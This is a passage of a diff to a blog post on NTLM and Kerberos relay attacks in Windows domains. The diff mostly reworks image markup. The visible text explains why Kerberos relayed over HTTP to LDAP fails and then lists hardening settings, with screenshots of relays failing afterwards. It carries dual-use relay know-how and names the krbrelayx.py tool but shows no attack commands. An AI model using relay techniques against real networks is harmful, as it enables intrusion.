 On the other hand, even using Kerberos authentication over HTTP, we cannot relay it to LDAP/LDAPS regardless of service settings. According to <a href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with">the article</a> by Synacktiv,
@@ -628,14 +687,15 @@ When the Negotiate security package (WWW-Authenticate : Negotiate) is used to pe
 </blockquote>
 
 We can verify the behavior, and we can see that krbrelayx.py cannot continue the LDAP session. This is a common limitation across all Kerberos relaying techniques (over HTTP, DNS, and SMB). Without the session key from the AP-REQ, we cannot sign LDAP messages, so the server rejects the session after initial authentication.
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/63.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">LDAP session by krbrelayx.py</div>
-</div>
+  <figcaption>LDAP session by krbrelayx.py</figcaption>
+</figure>
 
 ## Mitigations
 #### SMB
-<p style="margin-bottom:0.25em">
+<p>
 You need to require SMB signing on all servers and clients.  
 </p>
 ```registry
@@ -643,21 +703,24 @@ Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies
 Policy: Microsoft network server: Digitally sign communications (always)
 Value:  Enabled
 ```
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/67.png" width="650" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing SMB signing</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Enforcing SMB signing</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/74.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">SMB signing is required</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>SMB signing is required</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/75.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to SMB failed</div>
-</div>
+  <figcaption>NTLM relay to SMB failed</figcaption>
+</figure>
 
 #### LDAP/LDAPS
-<p style="margin-bottom:0.25em">
+<p>
 You need to require LDAP signing and LDAP channel binding.  
 </p>
 ```registry
@@ -665,76 +728,89 @@ Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies
 Policy: Domain controller: LDAP server signing requirements
 Value:  Require signing
 ```
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/69.png" width="650" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing LDAP signing</div>
-</div>
+  <figcaption>Enforcing LDAP signing</figcaption>
+</figure>
 
 ```registry
 Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options  
 Policy: Domain controller: LDAP server channel binding token requirements
 Value:  Always
 ```
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/68.png" width="650" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing LDAP channel binding</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Enforcing LDAP channel binding</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/76.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">LDAP signing and LDAP channel binding are required</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>LDAP signing and LDAP channel binding are required</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/77.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to LDAP failed</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>NTLM relay to LDAP failed</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/78.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to LDAPS failed</div>
-</div>
+  <figcaption>NTLM relay to LDAPS failed</figcaption>
+</figure>
 
 #### HTTP/HTTPS
 You need to disable HTTP and require EPA on HTTPS.
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/70.png" width="600" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Disabling HTTP</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Disabling HTTP</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/71.png" width="580" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing EPA</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Enforcing EPA</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/79.png" width="550" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">HTTP is disabled and EPA is required</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>HTTP is disabled and EPA is required</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/80.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to HTTPS failed</div>
-</div>
+  <figcaption>NTLM relay to HTTPS failed</figcaption>
+</figure>
 
 #### WinRMS
 You need to update CbtHardeningLevel to "Strict".
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/72.png" width="700" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Update CbtHardeningLevel</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Update CbtHardeningLevel</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/81.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to WinRMS failed</div>
-</div>
+  <figcaption>NTLM relay to WinRMS failed</figcaption>
+</figure>
 
 #### MSSQL
 You need to required EPA on all servers.
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/73.png" width="600" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Require EPA</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Require EPA</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/82.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to MSSQL failed</div>
-</div>
+  <figcaption>NTLM relay to MSSQL failed</figcaption>
+</figure>
 
 #### Others
-<p style="margin-bottom:0.25em">
+<p>
 You also need to disable NTLMv1.  
 </p>
 ```registry
@@ -742,10 +818,11 @@ Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies
 Policy: Network security: LAN Manager authentication level  
 Value:  Send NTLMv2 response only. Refuse LM & NTLM
 ```
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/83.png" width="650" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Disable NTLMv1</div>
-</div>
+  <figcaption>Disable NTLMv1</figcaption>
+</figure>
 
 <p style="margin-bottom:0.25em">
 Other recommended mitigations:
